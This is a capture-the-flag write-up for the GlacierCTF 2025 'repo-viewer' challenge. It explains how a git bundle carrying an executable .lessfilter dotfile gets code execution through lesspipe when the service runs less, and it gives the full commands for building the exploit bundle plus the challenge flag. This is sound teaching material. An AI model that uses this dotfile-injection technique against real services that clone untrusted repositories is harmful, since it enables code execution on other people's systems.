# GlacierCTF 2025 – misc/repo-viewer

*Published: 2025-11-22*

This weekend, I played GlacierCTF 2025 with [Psi Beta Rho](https://pbr.acmcyber.com/). I wanted to share my solution to a misc challenge I solved called "Repo Viewier." We get this description

> I don’t trust Markdown files, so I wrote a service that displays them for me!
> Send it a git bundle and it will show you the README.md inside.

and a netcat endpoint and a zip with the deployment files, so the first thing I did was open those and see what the service actually does.


## Environment

The core script is pretty small. After some banner text, it reads base64 input until it sees an `@`, decodes it into a git bundle, and clones it into the working directory. After that, it does a couple of things before showing the README:

```sh
git clone /tmp/repo.bundle .

eval $(lesspipe)
cp /data/.lesskey .lesskey

if [ -L README.md ]; then
    echo "No funny business!"
    exit 1
fi

less README.md
```

At first glance, this looks pretty locked down. They explicitly check that `README.md` isn’t a symlink, and they copy in a custom `.lesskey` that disables all the usual ways you’d escape `less` into a shell. I spent a bit of time poking at the obvious ideas anyway including symlinks, different filenames, etc.


## Vulnerability

This is the line I decided to look at: 

```sh
eval $(lesspipe)
```

I knew that `lesspipe` is a helper that tells `less` how to preprocess files, but I didn’t remember the details. So I looked up the docs. I noticed something interesting: `lesspipe` explicitly checks for a user-defined filter called `~/.lessfilter`. If that file exists and is executable, `lesspipe` will run it and use its output instead of the file’s contents.

This is something we can exploit. The service clones the git bundle directly into `/home/challenge`, and the Docker config sets `HOME=/home/challenge`. That means anything I put in the repo ends up directly in `$HOME`. Including dotfiles.

So if I include a file named `.lessfilter` in my git bundle, when the server runs `less README.md`, the flow becomes:

`less` -> `lesspipe` -> `~/.lessfilter`

In other words, I get code execution before `less` ever displays anything. The `.lesskey` restrictions don’t matter because my code runs earlier. Also the symlink check doesn’t matter because I’m not touching `README.md` at all.


## Exploit

From the Dockerfile, I saw that the flag is copied as `flag.txt` into `/jail`, and that directory is mounted as `/` inside the nsjail. All I need is a repository with a normal README (so the script is happy) and an executable `.lessfilter` that just prints the flag.


```bash
git init
git checkout -b main
echo "just a normal readme :)" > README.md
```

Then I added the payload `.lessfilter`:

```bash
cat > .lessfilter << 'EOF'
#!/bin/sh
cat /flag.txt
EOF
chmod +x .lessfilter
```

commit everything:

```bash
git add README.md .lessfilter
git commit -m "lessfilter exploit"
git bundle create exploit.bundle --all
base64 exploit.bundle > exploit.b64
```

The service expects interactive input terminated by `@`, so I connected with netcat, pasted the base64, hit enter, typed `@`, and hit enter twice.


## What Happens

When the server processes the bundle, it clones my repo into `/home/challenge`. That drops `.lessfilter` straight into the home directory. Then it runs `eval $(lesspipe)`, which configures `less` to use `lesspipe` for preprocessing. Finally, when it runs `less README.md`, `lesspipe` sees `~/.lessfilter` and executes it.

Instead of showing the README, the pager displays whatever my script printed, which was the flag.


## Flag

```
gctf{B3w4r3_0f_0bscur3_5hell_F34tur3s}
```


Thanks to the Glacier CTF team for putting together some fun challenges!
